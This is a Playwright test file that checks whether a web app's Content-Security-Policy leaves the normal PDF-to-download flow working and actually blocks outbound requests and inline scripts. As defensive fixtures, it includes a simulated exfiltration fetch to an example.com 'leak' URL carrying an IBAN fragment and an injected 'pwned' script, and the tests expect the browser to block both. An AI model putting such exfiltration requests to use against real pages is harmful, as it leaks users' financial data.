/**
 * The production build ships a Content-Security-Policy (scripts/csp.ts). These tests prove two
 * different things: that the policy does not break the product, and that it genuinely enforces
 * the "nothing leaves your browser" promise instead of merely decorating the page.
 */
import { test as plain } from "@playwright/test"
import {
  downloadResult,
  expect,
  fillMissingFromExpected,
  generate,
  importToReview,
  readFixture,
  test,
} from "./helpers"

declare global {
  interface Window {
    __csp: string[]
  }
}

/** Runs in the page before any script: records every CSP violation the browser reports. */
const recordViolations = () => {
  window.__csp = []
  document.addEventListener("securitypolicyviolation", (e) => {
    window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`)
  })
}

test("a complete flow runs under the policy without a single violation", async ({
  page,
}, testInfo) => {
  await page.addInitScript(recordViolations)
  const fixture = readFixture("02")
  await importToReview(page, fixture.pdfPath)
  await fillMissingFromExpected(page, fixture, { record: false })
  await generate(page)
  await downloadResult(page, (name) => testInfo.outputPath(name))
  expect(await page.evaluate(() => window.__csp)).toEqual([])
})

test("the non-embedded-font path (lazy font chunks, blob downloads) also stays within the policy", async ({
  page,
}, testInfo) => {
  await page.addInitScript(recordViolations)
  const fixture = readFixture("13")
  await importToReview(page, fixture.pdfPath)
  await fillMissingFromExpected(page, fixture, { record: false })
  await generate(page)
  await downloadResult(page, (name) => testInfo.outputPath(name))
  expect(await page.evaluate(() => window.__csp)).toEqual([])
})

plain("the built page carries the policy", async ({ page }) => {
  await page.goto("/")
  const policy = await page
    .locator('meta[http-equiv="Content-Security-Policy"]')
    .getAttribute("content")
  expect(policy).toContain("connect-src 'self'")
  expect(policy).toContain("default-src 'self'")
  expect(policy).not.toMatch(/unsafe-inline|unsafe-eval/)
})

plain(
  "the policy is ENFORCED: a request to a foreign origin is blocked by the browser",
  async ({ page }) => {
    await page.addInitScript(recordViolations)
    await page.goto("/")
    const outcome = await page.evaluate(() =>
      fetch("https://example.com/leak?iban=FR76").then(
        () => "sent",
        () => "blocked",
      ),
    )
    expect(outcome).toBe("blocked")
    const violations = await page.evaluate(() => window.__csp)
    expect(violations.some((v) => v.startsWith("connect-src"))).toBe(true)
  },
)

plain("inline script injection is blocked", async ({ page }) => {
  await page.addInitScript(recordViolations)
  await page.goto("/")
  const ran = await page.evaluate(() => {
    const s = document.createElement("script")
    s.textContent = "window.__pwned = true"
    document.head.appendChild(s)
    return (window as unknown as { __pwned?: boolean }).__pwned === true
  })
  expect(ran).toBe(false)
  expect((await page.evaluate(() => window.__csp)).some((v) => v.startsWith("script-src"))).toBe(
    true,
  )
})
